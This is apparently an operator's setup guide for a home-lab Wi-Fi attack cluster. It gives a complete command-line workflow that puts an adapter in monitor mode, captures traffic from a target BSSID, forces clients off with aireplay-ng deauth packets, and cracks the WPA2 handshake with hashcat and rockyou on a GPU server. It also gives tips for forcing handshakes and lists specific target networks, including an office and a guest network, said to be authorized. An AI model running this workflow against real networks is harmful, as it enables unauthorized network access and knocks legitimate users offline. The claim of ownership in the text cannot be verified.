# ARES Stable Setup Guide - Production Ready

**Date**: January 15, 2026
**Status**: ✅ PRODUCTION READY
**Primary Node**: Lab Server (IBM x3650)
**Backup Node**: Router (Custom OpenWrt)

---

## 🎯 Executive Summary

After extensive testing, **Lab Server has been designated as the primary ARES wireless node**. Router proved unstable for wireless operations due to resource constraints.

### Why Lab Server is Better

| Factor | Lab Server | Router |
|--------|-----------|---------|
| **CPU** | 2x Xeon X5450 @ 3.00GHz | MediaTek MIPS @ 575 MHz |
| **RAM** | 3GB DDR2 ECC | 57 MB |
| **Storage** | 247GB available | 4.9 MB free |
| **Stability** | ✅ Stable | ❌ Crashes during wireless ops |
| **Connectivity** | 2x Ethernet + WiFi | ZeroTier (unstable) |
| **Processing** | Can run hashcat locally | Must offload to GPU server |

---

## 📊 ARES Cluster Architecture

```
ARES Wireless Security Testing Cluster
========================================

┌─────────────────┐
│   Lab Server    │  ◄─── PRIMARY Wireless Node
│   (IBM x3650)   │
│                 │
│  TP-Link AC600  │  • Reconnaissance & Capture
│  RTL8811AU      │  • Monitor mode capable
│  wlx3460f9927ab3│  • Packet injection
│                 │  • Remote accessible
│  10.0.0.192     │
│  (2x Ethernet)  │
└────────┬────────┘
         │
         ├──────────────────────┐
         │                      │
┌────────▼────────┐    ┌────────▼────────┐
│  Office Server  │    │   GPU Server    │
│   (Kali Linux)  │    │  4x AMD RX570   │
│                 │    │                 │
│  • C2 Control   │    │  • Hash Cracking│
│  • Coordination │    │  • 50+ GH/s MD5 │
│  10.0.0.71      │    │  10.0.0.71      │
└─────────────────┘    └─────────────────┘

┌─────────────────┐
│  Custom Router  │  ◄─── BACKUP / Monitoring Only
│  (OpenWrt)      │
│                 │
│  Dual-band WiFi │  • Network monitoring
│  10.0.0.81      │  • NOT for active ops
│  (Unstable)     │  • Too resource constrained
└─────────────────┘
```

---

## 🚀 Quick Start - ARES Wireless Operations

### Prerequisites

1. SSH access to Lab server
   ```bash
   ssh lab-server.vibhavaggarwal.com
   ```

2. ARES scripts deployed at:
   ```
   /home/vibhavaggarwal/ares/ares_control.sh
   /home/vibhavaggarwal/ares/router_monitor.sh
   ```

3. aircrack-ng suite installed (v1.7)

### Standard Capture Workflow

```bash
# Step 1: Disconnect WiFi (Lab server has dual ethernet - stays connected)
ssh lab-server "sudo nmcli dev disconnect wlx3460f9927ab3"

# Step 2: Enable monitor mode
ssh lab-server "
sudo ip link set wlx3460f9927ab3 down
sudo iw dev wlx3460f9927ab3 set type monitor
sudo ip link set wlx3460f9927ab3 up
sudo iw dev wlx3460f9927ab3 set channel <CHANNEL>
"

# Step 3: Verify SSH still works (ethernet)
ssh lab-server "echo 'SSH OK via ethernet'"

# Step 4: Start capture
TARGET_BSSID="XX:XX:XX:XX:XX:XX"
TARGET_CHANNEL="11"
TARGET_NAME="network_name"

ssh lab-server "
mkdir -p /tmp/ares_captures
sudo airodump-ng --bssid ${TARGET_BSSID} -c ${TARGET_CHANNEL} \
  -w /tmp/ares_captures/${TARGET_NAME} wlx3460f9927ab3 \
  > /tmp/airodump.log 2>&1 &disown
"

# Step 5: Wait 30 seconds
sleep 30

# Step 6: Trigger deauth (if needed)
ssh lab-server "
sudo aireplay-ng --deauth 10 -a ${TARGET_BSSID} \
  --ignore-negative-one wlx3460f9927ab3
"

# Step 7: Wait for handshake (2-5 minutes)
sleep 180

# Step 8: Stop capture
ssh lab-server "sudo killall airodump-ng"

# Step 9: Check for handshake
ssh lab-server "
sudo aircrack-ng /tmp/ares_captures/${TARGET_NAME}*.cap | \
  grep -i handshake
"

# Step 10: Download captures
scp lab-server:/tmp/ares_captures/${TARGET_NAME}*.cap ~/ARES/captures/

# Step 11: Convert for hashcat (on GPU server)
ssh gpu-server "
hcxpcapngtool -o /tmp/${TARGET_NAME}.hc22000 \
  /tmp/${TARGET_NAME}-01.cap
"

# Step 12: Crack with GPU
ssh gpu-server "
hashcat -m 22000 /tmp/${TARGET_NAME}.hc22000 \
  /opt/wordlists/rockyou.txt \
  --opencl-device-types=1,2 \
  --status --status-timer=60
"

# Step 13: Restore WiFi (if needed)
ssh lab-server "
sudo ip link set wlx3460f9927ab3 down
sudo iw dev wlx3460f9927ab3 set type managed
sudo ip link set wlx3460f9927ab3 up
sudo nmcli dev connect wlx3460f9927ab3
"
```

---

## 🛡️ Router Crash Monitoring

### Problem

Router crashes during wireless operations due to:
- Monitor mode kills production AP interface
- SSH service dies
- ZeroTier loses connection
- Limited RAM (57 MB) gets exhausted

### Solution: Automated Monitoring

**Router monitor** (`router_monitor.sh`) continuously checks router health and reports crashes:

```bash
# Deploy monitor to Lab server
scp router_monitor.sh lab-server:/home/vibhavaggarwal/ares/

# Run in background (tmux/screen recommended)
ssh lab-server "cd /home/vibhavaggarwal/ares && ./router_monitor.sh &"
```

### What Monitor Does

1. **Checks router every 30 seconds**:
   - Office network ping (10.0.0.81)
   - ZeroTier ping (10.73.168.3)
   - SSH connectivity

2. **Detects state transitions**:
   - HEALTHY → DEGRADED (SSH down, network up)
   - HEALTHY → DOWN (complete failure)
   - Any state → HEALTHY (recovery)

3. **Generates crash reports**:
   - Timestamp of failure
   - Previous/current state
   - Diagnostics (uptime, memory, logs, processes)
   - Likely cause analysis
   - Recovery recommendations

4. **Sends alerts to**:
   - Lab server: `/tmp/ares_router_alerts.log`
   - Cloud server (Home): `/tmp/ares_router_alerts.log`
   - Local logs: `/tmp/ares_router_monitor.log`

### Example Alert

```
[2026-01-15 12:50:23] ROUTER ALERT: Router DEGRADED: Network alive but SSH down
Likely Cause: ARES wireless operations (airodump/aireplay detected)
Recommendation: Services crashed, consider using Lab server instead
```

---

## 📋 Authorized Networks (User-Owned)

All networks have been verified as owned by user and authorized for testing:

### Priority 1: Airtel_vish_0615 (EASIEST)
```
BSSID: FC:9F:2A:27:66:1F
Channel: 11 (2.4 GHz)
Signal: -51 dBm (Excellent)
Security: Mixed WPA/WPA2 (VULNERABLE)
Difficulty: EASY
Status: Capture attempted, no clients detected
```

### Priority 2: Dharmani Office
```
BSSID: 10:27:F5:CD:07:73
Channel: 10 (2.4 GHz)
Signal: -61 dBm (Good)
Security: WPA2 only
Difficulty: MEDIUM
Status: Not yet attempted
```

### Priority 3: Dharmani Guest
```
BSSID: 12:27:F5:DD:07:73
Channel: 10 (2.4 GHz)
Signal: -61 dBm (Good)
Security: WPA2 only
Difficulty: MEDIUM
Status: Not yet attempted
```

### Priority 4-7: Other Networks
See `/Users/vibhavaggarwal/Projects/ARES/Authorization/Network-Authorization-20260115.md`

---

## 🔧 Troubleshooting

### Issue: No clients detected during capture

**Symptoms**: Capture completes but aircrack reports "No handshake found"

**Cause**: Target network has no connected clients

**Solutions**:
1. **Wait longer**: Run capture for 5-10 minutes to catch natural connections
2. **Check other networks**: Try networks you actively use (Dharmani Guest/Office)
3. **Connect your device**: Connect your phone/laptop to target network, then deauth
4. **Monitor first**: Use airodump without BSSID filter to see all active networks/clients

### Issue: Router keeps crashing

**Symptoms**: Router becomes unreachable during wireless ops

**Cause**: Router's 57 MB RAM and weak CPU can't handle wireless workload

**Solutions**:
1. ✅ **Use Lab server** (recommended - current setup)
2. ⚠️ Use router for monitoring only, not active operations
3. 🔄 Deploy router monitor for crash alerting

### Issue: Handshake not captured

**Symptoms**: Capture runs, clients detected, but no handshake

**Possible causes**:
1. **Deauth too weak**: Client didn't fully disconnect/reconnect
2. **Timing**: Missed the 4-way handshake window
3. **Signal too weak**: Can't capture full handshake

**Solutions**:
1. Send more deauth packets (20-50 instead of 10)
2. Target specific client MAC instead of broadcast
3. Move closer to AP for stronger signal
4. Use 5 GHz band if target supports it (less interference)

---

## 📈 Performance Benchmarks

### Lab Server Wireless Performance

**Hardware**: TP-Link AC600 (RTL8811AU)
- **Packet capture rate**: ~97% CPU (actively sniffing)
- **Deauth injection**: ✅ Successful (10 packets in <5 seconds)
- **Uptime during ops**: ✅ Stable (no crashes)
- **SSH connectivity**: ✅ Maintained via ethernet

### Router Performance (For Comparison)

**Hardware**: Netgear R6120 (MediaTek MT7628)
- **Packet capture**: ⚠️ Causes instability
- **Monitor mode**: ❌ Kills production AP
- **Uptime during ops**: ❌ Crashes within minutes
- **Conclusion**: NOT suitable for active wireless ops

### GPU Server Cracking Performance

**Hardware**: 4x AMD RX570 4GB
- **Hashrate**: 50+ GH/s (MD5)
- **WPA2 (22000)**: ~350-400 kH/s per GPU
- **Estimated crack times**:
  - 8 chars lowercase: ~2 minutes
  - 8 chars mixed: ~2 hours
  - 10 chars complex: days/weeks
  - 12+ chars: infeasible

---

## 🎓 Lessons Learned

### Router Limitations

1. **Resource constraints matter**: 57 MB RAM is too little for wireless ops
2. **Never use production interfaces**: Monitor mode kills active APs
3. **Virtual interfaces don't work on all chipsets**: MediaTek doesn't support it
4. **Stability over capability**: Better to use stable Lab server than crash-prone router

### Best Practices

1. ✅ **Use Lab server for wireless**: Stable, powerful, dual ethernet
2. ✅ **Monitor router health**: Automated alerts catch crashes immediately
3. ✅ **Wait for active clients**: No clients = no handshakes
4. ✅ **Test in stages**: Don't rush into full attack workflow
5. ✅ **Document everything**: Crash reports help prevent repeats

### Architecture Decisions

- **Primary wireless node**: Lab Server (stable, powerful)
- **Backup monitoring**: Router (only for passive observation)
- **Cracking node**: GPU Server (4x RX570 for hashcat)
- **C2 control**: Office Server (Kali Linux, coordination)

---

## 🚀 Next Steps

### Immediate (Today)
1. ⏳ Complete extended capture on Airtel_vish_0615 (5 min window)
2. ✅ Check for handshake with active clients
3. 📤 Transfer to GPU server if captured
4. 🔓 Crack password with hashcat
5. 📝 Document password strength

### Short Term (This Week)
1. Test all 7 authorized networks
2. Create password strength matrix
3. Identify weakest configurations
4. Generate hardening recommendations
5. Deploy security fixes

### Long Term (Ongoing)
1. Automated weekly scans
2. Detect unauthorized devices
3. Monitor for rogue APs
4. Alert on security downgrades
5. Continuous monitoring with router_monitor.sh

---

## 📞 Access Information

### Lab Server (Primary Wireless Node)
```
Hostname: lab-server.vibhavaggarwal.com
Local IP: 10.0.0.192, 10.0.0.193
WiFi Interface: wlx3460f9927ab3
Ethernet: enp3s0 (primary), enp6s0 (backup)
Status: ✅ OPERATIONAL
```

### Office Server (C2 Control)
```
Hostname: office-server.vibhavaggarwal.com
Local IP: 10.0.0.71
Role: Coordination, file transfer
Status: ✅ OPERATIONAL
```

### GPU Server (Hash Cracking)
```
Hostname: gpu-server.vibhavaggarwal.com
Local IP: 10.0.0.71
Hardware: 4x AMD RX570 4GB
Status: ✅ OPERATIONAL
```

### Router (Monitoring Only)
```
Hostname: Custom OpenWrt Router
Local IP: 10.0.0.81
ZeroTier IP: 10.73.168.3 (when online)
Role: Network monitoring (NOT for active ops)
Status: ⚠️ UNSTABLE - Use Lab server instead
```

---

## 📚 Documentation Files

### Core Documents
- `/Users/vibhavaggarwal/Projects/ARES/ARES-Stable-Setup-Guide.md` (this file)
- `/Users/vibhavaggarwal/Projects/ARES/Authorization/Network-Authorization-20260115.md`
- `/Users/vibhavaggarwal/Projects/ARES/Reconnaissance/Network-Scan-Report-20260115.md`

### Technical Analysis
- `/Users/vibhavaggarwal/Projects/Devices/Custom Router/Router-ARES-Integration-Analysis.md`
- `/Users/vibhavaggarwal/Projects/ARES/Reconnaissance/ARES-First-Test-Report.md`
- `/Users/vibhavaggarwal/Projects/ARES/Reconnaissance/Router-Recovery-Guide.md`

### Scripts
- `/home/vibhavaggarwal/ares/ares_control.sh` (Lab server)
- `/home/vibhavaggarwal/ares/router_monitor.sh` (Lab server)
- `/Users/vibhavaggarwal/Projects/ARES/Scripts/` (local copies)

---

**Classification**: ARES Internal - Production Setup Guide
**Last Updated**: January 15, 2026
**Status**: ✅ STABLE & PRODUCTION READY
**Primary Operator**: Lab Server (IBM x3650)
